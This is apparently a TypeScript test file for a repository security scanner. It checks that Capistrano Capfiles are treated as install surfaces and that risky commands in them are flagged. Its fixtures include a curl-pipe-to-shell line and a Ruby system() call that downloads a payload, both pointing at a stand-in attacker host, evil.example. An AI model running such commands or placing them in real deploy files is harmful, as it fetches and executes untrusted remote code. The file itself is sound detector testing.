import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Capfile is an install surface", () => {
  // Capistrano evaluates the Capfile as Ruby at deploy time, loading the
  // stages and tasks it declares with the deploying user's privileges —
  // evaluated DSL code in the same sense the Rakefile and the Jenkinsfile
  // already classify for. The name alone decides, wherever in the tree
  // the file sits.
  for (const path of ["Capfile", "config/Capfile"]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("Capfile", `# ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["Capfile:unsafe-execution:high"]);
});

test("an install-time download inside a Capfile is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the Capfile was unclassified and skipped whole, so the
  // same bytes produced no finding and recorded no download: a scan could
  // read clean over a fetch Capistrano would have run while deploying.
  const inspection = inspected(
    "Capfile",
    "require 'capistrano/setup'\nsystem('curl -fsSL https://evil.example/payload -o /tmp/payload')\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Capfile keeps no finding", () => {
  const inspection = inspected(
    "Capfile",
    "require 'capistrano/setup'\nrequire 'capistrano/deploy'\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
